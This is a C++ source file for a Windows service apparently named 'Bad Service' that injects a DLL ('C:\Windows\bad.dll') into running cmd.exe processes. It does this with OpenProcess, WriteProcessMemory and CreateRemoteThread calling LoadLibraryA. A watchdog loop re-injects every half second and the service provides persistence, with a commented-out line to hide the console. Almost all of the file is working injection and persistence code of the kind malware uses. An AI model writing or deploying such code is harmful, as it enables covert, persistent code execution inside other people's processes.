// Watchdog.cpp : This file contains the 'PopupThread' function. Program execution begins and ends there.

#include <iostream>
#include <stdio.h>
#include <Windows.h>
#include <tlhelp32.h>
#include <fstream>
#include <string>

#pragma comment(lib, "advapi32.lib")

#define ServiceName L"Bad Service"

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE ServiceStatusHandle;
HANDLE ServiceStopEvent = NULL;

/* FindProcessId
* @Description	: Finds the process ID that has the given name that is passsed
*
* @processName	: wstring of the process name that will be matched
*/
DWORD FindProcessId(const std::wstring& processName)
{
	// Sets up the ProcessEntry object and allocates the space for it
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);

	// Sets up the Handler and gets thhe processes
	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processesSnapshot == INVALID_HANDLE_VALUE) {
		return 0;
	}

	// Checks the first process and checks if the name matches
	Process32First(processesSnapshot, &processInfo);
	if (!processName.compare(processInfo.szExeFile)) {
		CloseHandle(processesSnapshot);
		return processInfo.th32ProcessID;
	}

	// Checks the rest of the processes and checks if their name matches
	while (Process32Next(processesSnapshot, &processInfo)) {
		if (!processName.compare(processInfo.szExeFile)) {
			CloseHandle(processesSnapshot);
			return processInfo.th32ProcessID;
		}
	}

	// Closes the handler
	CloseHandle(processesSnapshot);
	return 0;
}

/* IsAlive
* @Description	: Checks if the given ID that is passed is still active on
*				  the system
*
* @processID	: DWORD of the process ID to check
*/
DWORD IsAlive(HANDLE threadHandle)
{
	// Checks if the process is running or suspended
	DWORD result = WaitForSingleObject(threadHandle, 0);
	if (result == WAIT_OBJECT_0) {
		// the thread handle is signaled - the thread has terminated
		return 0;
	}
	else {
		// the thread handle is not signaled - the thread is still alive
		result = ResumeThread(threadHandle); // Resumes it incase it is suspended
		return 1;
	}
}

/* InjectProcess
* @Description	: Injects the given dll path to the target process name
*
* @dllPath	: The path to the dll that is going to be injected
* @processName	: The name of the process that it will be injecting into
*/
HANDLE InjectProcess(const char* dllPath, std::wstring processName)
{
	// Gets the process ID based on the target name
	int procID = FindProcessId(processName);

	// Opens the process with the target ID
	HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
	if (process == NULL) {
		printf("\t[!] Error: Could not find or open process: %d\n", procID);
		return 0;
	}
	else {
		printf("\t[*] Sucessfully openned process with ID: %d\n", procID);
	}

	// Gets the address to create the thread
	LPVOID addr = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
	if (addr == NULL) {
		printf("\t[!] Error: Could not get the process address\n");
		return 0;
	}
	else {
		printf("\t[*] Sucessfully obtained the process addr: %d\n", addr);
	}

	// Allocate memory for the process
	LPVOID arg = (LPVOID)VirtualAllocEx(process, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (arg == NULL) {
		printf("\t[!] Error: the memory could not be allocated inside the chosen process.\n");
		return 0;
	}
	else {
		printf("\t[*] Sucessfully alloced memory: %d\n", arg);
	}

	// Write the process to memory
	int n = WriteProcessMemory(process, arg, dllPath, strlen(dllPath), NULL);
	if (n == 0) {
		printf("\t[!] Error: there was no bytes written to the process's address space.\n");
		return 0;
	}
	else {
		printf("\t[*] Sucessfully wrote to process memory\n");
	}

	// Create the thread which starts the DLL
	HANDLE threadID = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)addr, arg, NULL, NULL);
	if (threadID == NULL) {
		printf("\t[!] Error: the remote thread could not be created.\n");
		return 0;
	}
	else {
		printf("\t[+] Success, the remote thread was successfully created: %d\n", threadID);
	}

	CloseHandle(process);
	return threadID;

}

DWORD WINAPI PopupThread(LPVOID lpParameter)
{
	// Hides the Console Window 
	//::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	// The path of the DLL to inject
	const char* dllPath = "C:\\Windows\\bad.dll";

	// Name of process to inject into
	std::wstring targetProcess = L"cmd.exe";

	// Inject the initial dll
	printf("[*] Attempting to inject dll: %s\n", dllPath);
	HANDLE injected = InjectProcess(dllPath, targetProcess);
	if (injected == 0) {
		printf("[!] Error: Initial process failed to inject\n");
	}
	else {
		printf("[*] Initial process has been injected\n");
	}

	/*
	* Check to see if the dll is still injected in the process
	* If the process isn't alive it will attempt to inject it again.
	*/
	while (1) {

		if (IsAlive(injected) == 0) {
			printf("[!] Process is no longer injected ... attempting to reinject\n");

			printf("\t[*] Attempting to reinject the dll\n");
			injected = InjectProcess(dllPath, targetProcess);
			if (injected == 0) {
				printf("\t[!] Error: Process failed to reinject\n");
			}
			else {
				printf("\t[+] Process has been reinjected");
			}

		}
		else {
			printf("[*] Process is still alive and well\n");
		}

		Sleep(500);
	}

	return 0;
}

VOID ReportServiceStatus(DWORD CurrentState, DWORD Win32ExitCode, DWORD WaitHint) {

	static DWORD CheckPoint = 1;

	ServiceStatus.dwCurrentState = CurrentState;
	ServiceStatus.dwWin32ExitCode = Win32ExitCode;
	ServiceStatus.dwWaitHint = WaitHint;

	if (CurrentState == SERVICE_START_PENDING) {
		ServiceStatus.dwControlsAccepted = 0;
	}
	else {
		ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
	}
	if ((CurrentState == SERVICE_RUNNING) ||
		(CurrentState == SERVICE_STOPPED))
		ServiceStatus.dwCheckPoint = 0;
	else ServiceStatus.dwCheckPoint = CheckPoint++;


	SetServiceStatus(ServiceStatusHandle, &ServiceStatus);

}

VOID WINAPI ServiceControlHandler(DWORD Control) {

	switch (Control)
	{
	case SERVICE_CONTROL_STOP:
		ReportServiceStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);
		SetEvent(ServiceStopEvent);
		ReportServiceStatus(ServiceStatus.dwCurrentState, NO_ERROR, 0);
	case SERVICE_CONTROL_INTERROGATE:
		break;

	default:
		break;
	}

}

VOID ServiceWorker(DWORD Argc, LPTSTR* Argv) {

	ServiceStopEvent = CreateEvent(
		NULL,
		TRUE,
		FALSE,
		NULL
	);

	if (ServiceStopEvent == NULL) {
		ReportServiceStatus(SERVICE_STOPPED, NO_ERROR, 0);
		return;
	}

	ReportServiceStatus(SERVICE_RUNNING, NO_ERROR, 0);

	DWORD ThreadID;
	HANDLE myHandle = CreateThread(0, 0, PopupThread, NULL, 0, &ThreadID);

	while (1) {
		WaitForSingleObject(ServiceStopEvent, INFINITE);
		ReportServiceStatus(SERVICE_STOPPED, NO_ERROR, 0);
		return;
	}
}

VOID WINAPI ServiceMain(DWORD Argc, LPTSTR* Argv) {

	ServiceStatusHandle = RegisterServiceCtrlHandler(
		ServiceName,
		ServiceControlHandler
	);

	ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	ServiceStatus.dwServiceSpecificExitCode = 0;

	ReportServiceStatus(SERVICE_START_PENDING, NO_ERROR, 3000);

	ServiceWorker(Argc, Argv);
}

int main()
{

	SERVICE_TABLE_ENTRY DispatchTable[] =
	{
		{(LPWSTR)ServiceName, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
		{NULL, NULL}
	};

	StartServiceCtrlDispatcher(DispatchTable);

}